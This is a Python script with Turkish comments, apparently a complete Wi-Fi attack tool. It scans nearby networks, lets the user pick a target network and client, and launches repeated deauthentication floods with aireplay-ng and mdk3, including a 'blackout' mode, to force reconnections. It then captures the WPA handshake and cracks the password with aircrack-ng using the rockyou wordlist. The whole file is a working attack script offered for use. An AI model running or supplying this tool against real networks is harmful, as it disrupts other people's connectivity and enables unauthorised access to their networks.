import os
import signal
import subprocess
import time
import sys
import csv
import re
import shutil
import glob
from typing import List, Tuple, Optional
from tabulate import tabulate
from termcolor import colored

# === GLOBAL ===
network_list: List[Tuple[str, str, str, str, str]] = []  # BSSID, channel, ESSID, ENC, PWR
client_list: List[Tuple[str, str]] = []
airodump_proc: Optional[subprocess.Popen] = None
aireplay_proc: Optional[subprocess.Popen] = None
mdk3_proc: Optional[subprocess.Popen] = None
mon_iface: str = ""
phy_iface: str = ""  # Fiziksel arayüzü saklamak için
capture_dir: str = os.getcwd()
cleaned_up = False  # Temizleme işleminin tekrarlanmasını önlemek için
xterm_procs: List[subprocess.Popen] = []  # Açılan xterm süreçlerini takip etmek için

def run_cmd(cmd: str, capture: bool = False, new_terminal: bool = False, geometry: str = None) -> Optional[str]:
    """Komut çalıştırır ve çıktıyı döndürür."""
    try:
        if new_terminal:
            if not shutil.which("xterm"):
                print(colored("[-] Hata: xterm yüklü değil. Lütfen yükleyin: sudo apt install xterm", "red"))
                return None
            terminal_cmd = f"xterm -geometry {geometry} -e '{cmd} && exit' &" if geometry else f"xterm -e '{cmd} && exit' &"
            proc = subprocess.Popen(terminal_cmd, shell=True)
            xterm_procs.append(proc)  # xterm sürecini listeye ekle
            return None
        if capture:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[-] Komut hatası: {cmd}\nHata: {result.stderr}", "red"))
                return None
            return result.stdout
        subprocess.run(cmd, shell=True, check=True)
        return None
    except subprocess.CalledProcessError as e:
        print(colored(f"[-] Komut hatası: {cmd}\nHata: {e.stderr}", "red"))
        return None
    except Exception as e:
        print(colored(f"[-] Genel komut hatası: {cmd}\nHata: {e}", "red"))
        return None

def select_interface() -> str:
    """Kullanıcıdan kablosuz arayüz seçtirir."""
    output = run_cmd("iw dev", capture=True)
    if not output:
        print(colored("[-] Kablosuz arayüz bulunamadı.", "red"))
        sys.exit(1)

    interfaces = [line.split()[1] for line in output.splitlines() if "Interface" in line]
    if not interfaces:
        print(colored("[-] Kullanılabilir kablosuz arayüz yok.", "red"))
        sys.exit(1)

    print(colored("\n=== Mevcut Kablosuz Arayüzler ===", "green"))
    for i, iface in enumerate(interfaces):
        print(colored(f"{i}: {iface}", "cyan"))
    print(colored("=================================", "green"))

    while True:
        try:
            idx = int(input(colored("Kullanılacak arayüz numarası: ", "yellow")))
            if 0 <= idx < len(interfaces):
                return interfaces[idx]
            print(colored("[-] Geçersiz seçim. Listedeki numaralardan birini girin.", "red"))
        except ValueError:
            print(colored("[-] Sayı girmeniz gerekiyor.", "red"))

def start_monitor_mode(iface: str) -> str:
    """Arayüzü monitör moda alır."""
    global phy_iface
    phy_iface = iface
    print(colored(f"[*] Monitör mod başlatılıyor: {iface}", "yellow"))
    
    run_cmd("systemctl stop NetworkManager")
    run_cmd("airmon-ng check kill")
    
    run_cmd(f"airmon-ng start {iface}")
    mon_iface = iface + "mon"
    if not os.path.exists(f"/sys/class/net/{mon_iface}"):
        print(colored(f"[-] Monitör mod başlatılamadı: {mon_iface}", "red"))
        sys.exit(1)
    
    output = run_cmd(f"iwconfig {mon_iface}", capture=True)
    if output and "Mode:Monitor" in output:
        print(colored(f"[+] Monitör mod aktif: {mon_iface}", "green"))
    else:
        print(colored(f"[-] Monitör mod doğrulanamadı: {mon_iface}", "red"))
        print(colored(f"[*] Arayüz durumunu kontrol edin: iwconfig {mon_iface}", "yellow"))
        sys.exit(1)
    return mon_iface

def ensure_write_permissions(directory: str) -> None:
    """Çalışma dizininde yazma izinlerini kontrol eder ve ayarlar."""
    try:
        print(colored(f"[*] Dizin yazma izni kontrol ediliyor: {directory}", "yellow"))
        if not os.access(directory, os.W_OK):
            print(colored(f"[*] Yazma izni yok. İzinler ayarlanıyor...", "yellow"))
            run_cmd(f"chmod u+w {directory}")
        test_file = os.path.join(directory, "test_write.txt")
        with open(test_file, "w") as f:
            f.write("test")
        os.remove(test_file)
        print(colored(f"[+] Dizin yazılabilir: {directory}", "green"))
    except Exception as e:
        print(colored(f"[-] Dizin yazma izni ayarlanamadı: {e}", "red"))
        print(colored(f"[*] Lütfen dizin izinlerini manuel kontrol edin: ls -ld {directory}", "yellow"))
        sys.exit(1)

def parse_networks(csv_file: str = "networks-01.csv") -> None:
    """CSV dosyasından ağları ve istemcileri ayrıştırır."""
    global network_list, client_list
    network_list = []
    client_list = []

    csv_path = os.path.join(capture_dir, csv_file)
    if not os.path.exists(csv_path):
        print(colored(f"[-] CSV dosyası bulunamadı: {csv_path}", "red"))
        return

    try:
        with open(csv_path, "r", encoding="utf-8") as f:
            reader = csv.reader(f, delimiter=',', skipinitialspace=True)
            section = "networks"
            header_seen = False
            client_header_seen = False
            for row_num, row in enumerate(reader, 1):
                if not row or all(not col.strip() for col in row):
                    if header_seen and not client_header_seen:
                        section = "clients"
                    continue
                if not header_seen and row[0].strip() == "BSSID":
                    header_seen = True
                    continue
                if section == "clients" and row[0].strip() == "Station MAC":
                    client_header_seen = True
                    continue
                if section == "networks":
                    try:
                        bssid = row[0].strip() if row[0] else ""
                        if not bssid or not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                            continue
                        channel = row[3].strip() if len(row) > 3 and row[3].strip() else "?"
                        enc = row[5].strip() if len(row) > 5 and row[5].strip() else "Bilinmeyen"
                        essid = row[13].strip() if len(row) > 13 and row[13].strip() else "Gizli Ağ"
                        power = row[8].strip() if len(row) > 8 and row[8].strip().lstrip('-').isdigit() else "?"
                        if bssid not in [x[0] for x in network_list]:
                            network_list.append((bssid, channel, essid, enc, power))
                    except Exception:
                        continue
                elif section == "clients" and len(row) >= 2:
                    try:
                        station = row[0].strip()
                        bssid = row[5].strip() if len(row) > 5 else ""
                        if bssid and station and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                            client_list.append((bssid, station))
                    except Exception:
                        continue

        if not network_list:
            print(colored("[-] Hiçbir ağ bulunamadı. CSV dosyası içeriği bozuk veya tarama süresi yetersiz.", "red"))
            print(colored(f"[*] Öneriler:", "yellow"))
            print(colored(f"  - Tarama süresini artırın (en az 25 saniye tarama yapın).", "yellow"))
            print(colored(f"  - Monitör modu kontrol edin: iwconfig {mon_iface}", "yellow"))
            print(colored(f"  - Manuel test: sudo airodump-ng {mon_iface} --write {csv_path} --output-format csv", "yellow"))

    except Exception as e:
        print(colored(f"[-] CSV ayrıştırma hatası: {e}", "red"))

    if network_list:
        table = []
        for idx, net in enumerate(network_list, 1):
            clients = [c[1] for c in client_list if c[0] == net[0]]
            table.append([idx, net[0], net[2], net[1], net[3], net[4], len(clients)])
        print(colored("\n=== Bulunan Ağlar ===", "green"))
        print(colored(tabulate(table, headers=["No", "BSSID", "ESSID", "Kanal", "Şifreleme", "Sinyal (PWR)", "İstemci Sayısı"], tablefmt="grid"), "cyan"))
        print(colored("=====================", "green"))

def select_target() -> Tuple[str, str, str]:
    """Kullanıcıdan hedef ağ seçtirir."""
    csv_file = "networks-01.csv"
    parse_networks(csv_file)

    if not network_list:
        print(colored("[-] Hiçbir ağ bulunamadı!", "red"))
        sys.exit(1)

    while True:
        try:
            choice = int(input(colored("\n[?] Hedef ağ numarası: ", "yellow")))
            if 1 <= choice <= len(network_list):
                bssid, channel, essid, enc, power = network_list[choice - 1]
                if not enc.startswith("WPA") and enc != "WEP":
                    print(colored(f"[!] Uyarı: {essid} ({bssid}) WPA/WEP değil ({enc}). Handshake yakalama başarısız olabilir.", "yellow"))
                if power.lstrip('-').isdigit() and int(power.lstrip('-')) > 70:
                    print(colored(f"[!] Uyarı: Sinyal gücü ({power} dBm) düşük. Handshake yakalama zor olabilir.", "yellow"))
                return bssid, channel, essid
            print(colored("[-] Geçersiz seçim. Listedeki numaralardan birini girin.", "red"))
        except ValueError:
            print(colored("[-] Sayı girmeniz gerekiyor.", "red"))

def select_client(bssid: str) -> Optional[str]:
    """Hedef ağa bağlı istemcilerden birini seçtirir."""
    clients = [c[1] for c in client_list if c[0] == bssid]
    if not clients:
        print(colored("[!] Bu ağda bağlı istemci bulunamadı. Tüm istemcilere saldırı uygulanacak.", "yellow"))
        print(colored("[*] Öneri: Hedef ağda bir cihazın aktif olduğundan emin olun (örneğin, video izleyin).", "yellow"))
        return None

    table = []
    for idx, client in enumerate(clients, 1):
        essid = next((net[2] for net in network_list if net[0] == bssid), "Bilinmeyen")
        table.append([idx, client, bssid, essid])
    print(colored("\n=== Bağlı İstemciler ===", "green"))
    print(colored(tabulate(table, headers=["No", "İstemci MAC", "BSSID", "ESSID"], tablefmt="grid"), "yellow"))
    print(colored("========================", "green"))

    while True:
        try:
            choice = int(input(colored("\n[?] Hedef istemci numarası (0 için tüm istemciler): ", "yellow")))
            if choice == 0:
                return None
            if 1 <= choice <= len(clients):
                return clients[choice - 1]
            print(colored("[-] Geçersiz seçim. Listedeki numaralardan birini girin.", "red"))
        except ValueError:
            print(colored("[-] Sayı girmeniz gerekiyor.", "red"))

def check_handshake(cap_prefix: str, bssid: str) -> Tuple[bool, str]:
    """En son oluşturulan .cap dosyasını kontrol eder ve handshake yakalanıp yakalanmadığını döner."""
    cap_files = sorted(glob.glob(f"{cap_prefix}-*.cap"), key=os.path.getmtime, reverse=True)
    if not cap_files:
        return False, ""
    
    cap_file = cap_files[0]  # En son oluşturulan .cap dosyası
    if not os.path.exists(cap_file) or os.path.getsize(cap_file) < 256:
        return False, cap_file
    
    time.sleep(3)  # Dosya yazımını bekle
    try:
        output = run_cmd(f"aircrack-ng {cap_file}", capture=True)
        if output:
            bssid_pattern = bssid.replace(":", r"[:\-]").lower()
            handshake_found = "(1 handshake)" in output or "WPA handshake" in output
            bssid_match = re.search(bssid_pattern, output, re.IGNORECASE)
            return bool(handshake_found and bssid_match), cap_file
        return False, cap_file
    except Exception as e:
        print(colored(f"[-] Handshake kontrol hatası: {e}", "red"))
        return False, cap_file

def crack_handshake(cap_file: str) -> None:
    """Handshake dosyasını aircrack-ng ile parola kırmaya çalışır."""
    print(colored("[*] Handshake doğrulandı. Parola kırma işlemi başlatılıyor...", "yellow"))
    default_wordlist = "/usr/share/wordlists/rockyou.txt"
    while True:
        try:
            sys.stdin.flush()
            wordlist = input(colored(f"[?] Parola listesi dosya yolunu girin (varsayılan: {default_wordlist}): ", "yellow")).strip()
            if not wordlist:
                wordlist = default_wordlist
            if os.path.exists(wordlist) and os.path.getsize(wordlist) > 0:
                break
            print(colored(f"[-] Wordlist dosyası bulunamadı veya boş: {wordlist}", "red"))
            print(colored("[*] Örnek yükleme: sudo gunzip /usr/share/wordlists/rockyou.txt.gz", "yellow"))
        except KeyboardInterrupt:
            print(colored("\n[*] Parola kırma işlemi iptal edildi. Ana menüye dönülüyor...", "yellow"))
            main()
            return

    crack_cmd = f"aircrack-ng {cap_file} -w {wordlist}"
    print(colored(f"[*] Parola kırma komutu: {crack_cmd}", "yellow"))
    try:
        subprocess.run(crack_cmd, shell=True)
    except KeyboardInterrupt:
        print(colored("\n[*] Parola kırma işlemi iptal edildi. Ana menüye dönülüyor...", "yellow"))
        main()
    except Exception as e:
        print(colored(f"[-] Parola kırma hatası: {e}", "red"))

def capture_handshake(bssid: str, channel: str, essid: str) -> bool:
    """Handshake yakalar ve ağda kesinti yaratır."""
    global airodump_proc, aireplay_proc, mdk3_proc, xterm_procs
    print(colored(f"\n[*] {essid} için handshake yakalama başlatılıyor (BSSID: {bssid}, Kanal: {channel})...", "yellow"))
    output_file = os.path.join(capture_dir, f"handshake_{essid.replace(' ', '_').replace('/', '_')}")
    handshake_cmd = f"airodump-ng {mon_iface} --bssid {bssid} --channel {channel} --write {output_file} --output-format pcap"

    run_cmd(f"iwconfig {mon_iface} channel {channel}")
    client_mac = select_client(bssid)
    deauth_counts = [0, 10, 20, 50, 100]
    terminal_positions = [
        "80x20+0+0",      # Sol-üst
        "80x20+960+0",    # Sağ-üst
        "80x20+0+360",    # Sol-orta
        "80x20+960+360",  # Sağ-orta
        "80x20+0+720",    # Sol-alt
        "80x20+960+720"   # Sağ-alt
    ]
    pos_index = 0

    mdk3_available = shutil.which("mdk3") is not None
    if not mdk3_available:
        print(colored("[!] mdk3 bulunamadı. Yüklemek için: sudo apt install mdk3", "yellow"))

    try:
        print(colored("[*] Handshake yakalama için airodump-ng başlatılıyor (ayrı xterm terminalinde)...", "yellow"))
        run_cmd(handshake_cmd, new_terminal=True, geometry="80x20+0+0")
        time.sleep(5)

        print(colored("[*] Ağ kesintisi başlatılıyor...", "yellow"))
        start_time = time.time()
        max_duration = 120
        while time.time() - start_time < max_duration:
            run_cmd(f"iwconfig {mon_iface} channel {channel}")
            has_handshake, cap_file = check_handshake(output_file, bssid)
            if has_handshake:
                print(colored(f"[+] Handshake yakalandı: {cap_file}", "green"))
                crack_handshake(cap_file)
                return True

            for count in deauth_counts:
                run_cmd(f"iwconfig {mon_iface} channel {channel}")
                print(colored(f"[*] aireplay-ng ile {count or 'sürekli'} paket deauth saldırısı başlatılıyor...", "yellow"))
                if client_mac:
                    deauth_cmd = f"aireplay-ng --deauth {count} -a {bssid} -c {client_mac} {mon_iface} --ignore-negative-one"
                    run_cmd(deauth_cmd, new_terminal=True, geometry=terminal_positions[pos_index % len(terminal_positions)])
                    pos_index += 1
                    time.sleep(5)
                deauth_cmd = f"aireplay-ng --deauth {count} -a {bssid} {mon_iface} --ignore-negative-one"
                run_cmd(deauth_cmd, new_terminal=True, geometry=terminal_positions[pos_index % len(terminal_positions)])
                pos_index += 1
                time.sleep(5)
                has_handshake, cap_file = check_handshake(output_file, bssid)
                if has_handshake:
                    print(colored(f"[+] Handshake yakalandı: {cap_file}", "green"))
                    crack_handshake(cap_file)
                    return True

            if mdk3_available:
                run_cmd(f"iwconfig {mon_iface} channel {channel}")
                has_handshake, cap_file = check_handshake(output_file, bssid)
                if has_handshake:
                    print(colored(f"[+] Handshake yakalandı: {cap_file}", "green"))
                    crack_handshake(cap_file)
                    return True
                print(colored("[*] mdk3 ile agresif deauth saldırısı başlatılıyor...", "yellow"))
                mdk3_cmd = f"mdk3 {mon_iface} d -b {bssid} -c {channel}"
                run_cmd(mdk3_cmd, new_terminal=True, geometry=terminal_positions[pos_index % len(terminal_positions)])
                pos_index += 1
                time.sleep(10)  # mdk3 süresini optimize ettik
                has_handshake, cap_file = check_handshake(output_file, bssid)
                if has_handshake:
                    print(colored(f"[+] Handshake yakalandı: {cap_file}", "green"))
                    crack_handshake(cap_file)
                    return True

                print(colored("[*] mdk3 ile blackout deauth saldırısı başlatılıyor...", "yellow"))
                mdk3_cmd = f"mdk3 {mon_iface} b -b {bssid}"
                run_cmd(mdk3_cmd, new_terminal=True, geometry=terminal_positions[pos_index % len(terminal_positions)])
                pos_index += 1
                time.sleep(10)
                has_handshake, cap_file = check_handshake(output_file, bssid)
                if has_handshake:
                    print(colored(f"[+] Handshake yakalandı: {cap_file}", "green"))
                    crack_handshake(cap_file)
                    return True

        print(colored("[-] 120 saniye içinde handshake yakalanamadı.", "red"))
        print(colored("[*] Öneriler:", "yellow"))
        print(colored("  - Daha uzun tarama yapın (120+ saniye).", "yellow"))
        print(colored("  - Hedef ağın sinyal gücünü kontrol edin (PWR > -70 olmalı).", "yellow"))
        print(colored("  - İstemci aktivitesini artırın (cihazda veri akışı yaratın, örneğin video izleyin).", "yellow"))
        print(colored(f"  - Kanalı manuel doğrulayın: iwconfig {mon_iface}", "yellow"))
        return False

    except KeyboardInterrupt:
        print(colored("\n[*] Handshake yakalama durduruluyor...", "yellow"))
        try:
            while True:
                sys.stdin.flush()
                response = input(colored("[?] Handshake yakalandı mı? (e/h): ", "yellow")).strip().lower()
                if response in ['e', 'h']:
                    if response == 'e':
                        has_handshake, cap_file = check_handshake(output_file, bssid)
                        if has_handshake:
                            print(colored(f"[+] Son yakalama dosyası kullanılıyor: {cap_file}", "green"))
                            crack_handshake(cap_file)
                            return True
                        else:
                            print(colored("[-] Hata: Yakalama dosyası bulunamadı veya handshake yok.", "red"))
                            return False
                    else:
                        while True:
                            sys.stdin.flush()
                            retry = input(colored("[?] Yeni bir ağ taraması yapmak ister misiniz? (e/h): ", "yellow")).strip().lower()
                            if retry in ['e', 'h']:
                                if retry == 'e':
                                    return True  # Yeni tarama için
                                else:
                                    bssid, channel, essid = select_target()
                                    return capture_handshake(bssid, channel, essid)
                            print(colored("[-] Hata: Lütfen 'e' veya 'h' seçin.", "red"))
                print(colored("[-] Hata: Lütfen 'e' veya 'h' seçin.", "red"))
        except KeyboardInterrupt:
            print(colored("\n[*] Kullanıcı tarafından iptal edildi.", "yellow"))
            return False
    finally:
        for proc in [airodump_proc, aireplay_proc, mdk3_proc]:
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    proc.kill()
                except Exception as e:
                    print(colored(f"[-] Süreç kapatma hatası: {e}", "red"))
        airodump_proc = None
        aireplay_proc = None
        mdk3_proc = None
        # xterm süreçlerini sonlandır
        for proc in xterm_procs:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
            except Exception:
                pass
        xterm_procs.clear()  # Liste sıfırlansın
        has_handshake, cap_file = check_handshake(output_file, bssid)
        if cap_file and os.path.exists(cap_file):
            print(colored(f"[+] Yakalama dosyası kaydedildi: {cap_file}", "green"))
        else:
            print(colored("[-] Yakalama dosyası oluşturulmadı.", "red"))

def start_new_scan() -> None:
    """Mevcut wlan0mon ile yeni tarama başlatır."""
    global airodump_proc
    print(colored("[*] Yeni ağ taraması başlatılıyor... (Ctrl+C ile durdur, en az 25 saniye tarama önerilir)", "yellow"))
    
    csv_path = os.path.join(capture_dir, "networks")
    scan_cmd = f"airodump-ng {mon_iface} --write {csv_path} --write-interval 1 --output-format csv"
    print(colored("[*] Airodump-ng tarama başlatılıyor...", "yellow"))
    
    airodump_proc = subprocess.Popen(scan_cmd, shell=True)
    try:
        airodump_proc.wait(timeout=60)
    except subprocess.TimeoutExpired:
        pass
    signal_handler(signal.SIGINT, None)

def signal_handler(sig, frame) -> None:
    """Ctrl+C sinyalini yönetir."""
    global airodump_proc
    print(colored("\n[*] Tarama durduruldu...", "yellow"))
    if airodump_proc:
        try:
            airodump_proc.terminate()
            airodump_proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            airodump_proc.kill()
        except Exception as e:
            print(colored(f"[-] Airodump-ng kapatma hatası: {e}", "red"))
        airodump_proc = None
    
    csv_path = os.path.join(capture_dir, "networks-01.csv")
    timeout = 10
    start_time = time.time()
    while time.time() - start_time < timeout:
        if os.path.exists(csv_path) and os.path.getsize(csv_path) > 0:
            print(colored(f"[+] CSV dosyası bulundu: {csv_path}", "green"))
            break
        time.sleep(1)
    else:
        print(colored(f"[-] Hata: {csv_path} dosyası {timeout} saniye içinde oluşturulmadı veya boş.", "red"))
        print(colored("[*] Olası nedenler:", "yellow"))
        print(colored(f"  - Yazma izni eksik: ls -ld {capture_dir}", "yellow"))
        print(colored("  - Airodump-ng tarama yapamadı: Çevrede ağ olmayabilir veya monitör modda sorun var.", "yellow"))
        print(colored(f"  - Monitör mod kontrolü: iwconfig {mon_iface}", "yellow"))
        sys.exit(1)

    while True:
        try:
            sys.stdin.flush()
            retry = input(colored("\n[?] Yeni bir ağ taraması yapmak ister misiniz? (e/h): ", "yellow")).strip().lower()
            if retry in ['e', 'h']:
                if retry == 'e':
                    start_new_scan()
                    return
                else:
                    break
            print(colored("[-] Geçersiz seçim. Lütfen 'e' veya 'h' girin.", "red"))
        except KeyboardInterrupt:
            print(colored("\n[*] Kullanıcı tarafından iptal edildi.", "yellow"))
            cleanup()
            sys.exit(0)

    bssid, channel, essid = select_target()
    success = capture_handshake(bssid, channel, essid)
    if not success:
        while True:
            try:
                sys.stdin.flush()
                retry = input(colored("\n[?] Farklı bir ağ için tekrar denemek ister misiniz? (e/h): ", "yellow")).strip().lower()
                if retry in ['e', 'h']:
                    if retry == 'e':
                        start_new_scan()
                    else:
                        cleanup()
                        sys.exit(0)
                    break
                print(colored("[-] Geçersiz seçim. Lütfen 'e' veya 'h' girin.", "red"))
            except KeyboardInterrupt:
                print(colored("\n[*] Kullanıcı tarafından iptal edildi.", "yellow"))
                cleanup()
                sys.exit(0)

def cleanup() -> None:
    """İşlemleri ve arayüzü temizler, ağ bağlantısını geri yükler."""
    global airodump_proc, aireplay_proc, mdk3_proc, mon_iface, phy_iface, cleaned_up, xterm_procs
    if cleaned_up:
        return  # Tekrar temizleme yapmayı önle
    cleaned_up = True

    print(colored("[*] Temizleme işlemi başlatılıyor...", "yellow"))

    for proc in [airodump_proc, aireplay_proc, mdk3_proc]:
        if proc:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
            except Exception as e:
                print(colored(f"[-] Süreç kapatma hatası: {e}", "red"))

    # xterm süreçlerini sonlandır
    for proc in xterm_procs:
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            proc.kill()
        except Exception:
            pass
    xterm_procs.clear()  # Liste sıfırlansın

    if mon_iface and os.path.exists(f"/sys/class/net/{mon_iface}"):
        print(colored(f"[*] Monitör mod durduruluyor: {mon_iface}", "yellow"))
        run_cmd(f"airmon-ng stop {mon_iface}")

    if phy_iface:
        print(colored(f"[*] Arayüz managed moda getiriliyor: {phy_iface}", "yellow"))
        run_cmd(f"iw dev {phy_iface} set type managed")
        run_cmd(f"ip link set {phy_iface} up")

    print(colored("[*] Ağ servisleri yeniden başlatılıyor...", "yellow"))
    run_cmd("systemctl restart NetworkManager")
    run_cmd("systemctl restart networking")
    run_cmd("rfkill unblock all")

    for temp_file in ["networks-01.csv"]:
        temp_path = os.path.join(capture_dir, temp_file)
        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
                print(colored(f"[*] Geçici dosya silindi: {temp_path}", "yellow"))
            except Exception as e:
                print(colored(f"[-] Geçici dosya silme hatası: {e}", "red"))

    time.sleep(2)
    output = run_cmd(f"iw dev {phy_iface} info", capture=True)
    if output and "type managed" in output:
        print(colored(f"[+] Arayüz {phy_iface} managed moda geçti.", "green"))
    else:
        print(colored(f"[-] Arayüz {phy_iface} managed moda geçemedi. Manuel kontrol edin.", "red"))

    print(colored("[*] Temizleme tamamlandı. Ağ bağlantınızı kontrol edin.", "green"))

def main() -> None:
    """Ana program akışı."""
    global cleaned_up
    cleaned_up = False  # Yeni çalıştırma için sıfırla

    if os.geteuid() != 0:
        print(colored("[-] Root olarak çalıştırılmalıdır. (sudo)", "red"))
        sys.exit(1)

    global mon_iface, airodump_proc
    try:
        iface = select_interface()
        mon_iface = start_monitor_mode(iface)
        ensure_write_permissions(capture_dir)

        print(colored("[*] Ağlar taranıyor... (Ctrl+C ile durdur, en az 25 saniye tarama önerilir)", "yellow"))
        signal.signal(signal.SIGINT, signal_handler)

        csv_path = os.path.join(capture_dir, "networks")
        scan_cmd = f"airodump-ng {mon_iface} --write {csv_path} --write-interval 1 --output-format csv"
        print(colored("[*] Airodump-ng tarama başlatılıyor...", "yellow"))
        
        airodump_proc = subprocess.Popen(scan_cmd, shell=True)
        try:
            airodump_proc.wait(timeout=60)
        except subprocess.TimeoutExpired:
            pass

    except KeyboardInterrupt:
        signal_handler(signal.SIGINT, None)
    except Exception as e:
        print(colored(f"[-] Hata: {e}", "red"))
    finally:
        cleanup()

if __name__ == "__main__":
    main()
